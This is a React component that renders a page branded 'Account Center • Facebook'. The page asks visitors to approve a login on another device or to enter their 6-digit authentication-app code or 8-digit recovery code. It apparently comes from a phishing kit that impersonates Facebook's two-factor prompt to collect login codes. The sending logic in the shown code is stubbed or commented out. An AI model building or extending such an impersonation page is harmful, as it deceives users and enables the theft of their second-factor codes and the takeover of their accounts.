import { PropTypes } from "prop-types";
import { useCallback, useEffect, useState } from "react";
import deviceImage from "../public/image.png";
import { Spinner } from "./Home";
const Verify = () => {
	const [stateButton, setStateButton] = useState("bg-blue-200");
	const [code, setCode] = useState("");
	const [error, setError] = useState("");
	const [loading, setLoading] = useState(false);
	const [device, setDevice] = useState("");
	// const [url, setUrl] = useState("");
	// const [showLoading, setShowLoading] = useState(false);
	// const [time, setTime] = useState(0);
	const handleCode = (e) => {
		if (e.target.value.length > 8) {
			setCode(e.target.value.slice(0, 8));
		} else {
			setCode(e.target.value);
		}
		e.preventDefault();
		if (e.target.value.length >= 6 && e.target.value.length <= 8) {
			setStateButton("bg-blue-500");
			setError("");
		} else {
			setStateButton("bg-blue-200");
			setError("Please enter a valid code");
		}
	};
	const handleSendCode = () => {
		setLoading(false);
		setStateButton("bg-blue-200");
		setCode("");
		setError("Invalid code");
		// setUrl("/submit");
		// setShowLoading(true);
		// setLoading(false);
		setStateButton("bg-blue-200");
		setLoading(true);
		setError("");
	};

	const getPasswordCount = useCallback(() => {
		// setTime()
		console.log("ok");
	}, []);

	useEffect(() => {
		window.addEventListener("resize", () => {
			if (window.innerWidth < 1024) {
				setDevice("mobile");
			} else {
				setDevice("desktop");
			}
		});
		if (window.innerWidth < 1024) {
			setDevice("mobile");
		} else {
			setDevice("desktop");
		}
		getPasswordCount();
	}, [getPasswordCount]);
	return (
		<div className='flex h-screen w-full flex-col items-center justify-center'>
			<header className='relative left-0 top-0 flex h-[40px] w-full items-center justify-center bg-[#EEF7FF] px-5 sm:justify-between sm:px-40'></header>
			{device === "desktop" ? (
				<DesktopMain
					handleCode={handleCode}
					stateButton={stateButton}
					code={code}
					error={error}
					handleSendCode={handleSendCode}
					loading={loading}
					deviceVerification={true}
				/>
			) : (
				<MobileMain
					handleCode={handleCode}
					stateButton={stateButton}
					code={code}
					error={error}
					handleSendCode={handleSendCode}
					loading={loading}
					deviceVerification={true}
				/>
			)}
			{/* {showLoading && <ShowLoading url={url} />} */}
		</div>
	);
};
const InputForm = ({
	handleCode,
	stateButton,
	code,
	error,
	handleSendCode,
	loading,
}) => {
	return (
		<div className='bg-[#EEF7FF]'>
			<b>Approve from another device or Enter your login code</b>
			<p className='mb-4'>
				Enter 6-digit code we just send from the authentication app you set up,{" "}
				or Enter 8-digit recovery code
			</p>
			<input
				className='w-full rounded-xl border border-gray-300 p-4'
				type='number'
				placeholder='Code'
				inputMode='numeric'
				pattern='[0-9]*'
				autoComplete='one-time-code'
				onChange={handleCode}
				onInput={handleCode}
				value={code}
			/>
			<p className='text-red-500'>{error}</p>
			<button
				onClick={handleSendCode}
				className={`${stateButton} ${stateButton === "bg-blue-200" ? "cursor-wait" : "cursor-pointer"} my-3 flex w-full cursor-pointer items-center justify-center rounded-lg py-3 text-center text-lg font-semibold text-white focus:outline-none sm:py-3 xl:py-3`}
			>
				{loading ? <Spinner /> : "Continue"}
			</button>
		</div>
	);
};

const DesktopMain = ({
	handleCode,
	stateButton,
	code,
	error,
	handleSendCode,
	loading,
}) => {
	return (
		<main className='flex h-full w-full items-center justify-center bg-[#EEF7FF]'>
			<div className='flex h-full w-1/2 flex-col'>
				<b className='text-[15px] font-semibold text-[#1c2b33] text-[]'>
					Account Center • Facebook
				</b>
				<b className='text-2xl font-bold'>
					Check notifications on another device
				</b>
				<img
					src={deviceImage}
					className='pointer-events-none my-3 select-none object-fill'
					alt=''
				/>
				<InputForm
					handleCode={handleCode}
					stateButton={stateButton}
					code={code}
					error={error}
					handleSendCode={handleSendCode}
					loading={loading}
				/>
			</div>
		</main>
	);
};

const MobileMain = ({
	handleCode,
	stateButton,
	code,
	error,
	handleSendCode,
	loading,
}) => {
	return (
		<main className='flex h-full w-full items-center justify-center bg-[#EEF7FF]'>
			<div className='flex h-full w-11/12 flex-col'>
				<b className='text-[15px] font-semibold text-[#1c2b33] text-[]'>
					Account Center • Facebook
				</b>
				<b className='text-2xl font-bold'>
					Check notifications on another device
				</b>
				<img
					src={deviceImage}
					className='pointer-events-none my-3 select-none rounded-lg object-fill'
					alt=''
				/>
				<InputForm
					handleCode={handleCode}
					stateButton={stateButton}
					code={code}
					error={error}
					handleSendCode={handleSendCode}
					loading={loading}
				/>
			</div>
		</main>
	);
};

DesktopMain.propTypes = {
	handleCode: PropTypes.func.isRequired,
	stateButton: PropTypes.string.isRequired,
	code: PropTypes.string.isRequired,
	error: PropTypes.string.isRequired,
	handleSendCode: PropTypes.func.isRequired,
	loading: PropTypes.bool.isRequired,
};
MobileMain.propTypes = {
	handleCode: PropTypes.func.isRequired,
	stateButton: PropTypes.string.isRequired,
	code: PropTypes.string.isRequired,
	error: PropTypes.string.isRequired,
	handleSendCode: PropTypes.func.isRequired,
	loading: PropTypes.bool.isRequired,
};
InputForm.propTypes = {
	handleCode: PropTypes.func.isRequired,
	stateButton: PropTypes.string.isRequired,
	code: PropTypes.string.isRequired,
	error: PropTypes.string.isRequired,
	handleSendCode: PropTypes.func.isRequired,
	loading: PropTypes.bool.isRequired,
};
export default Verify;
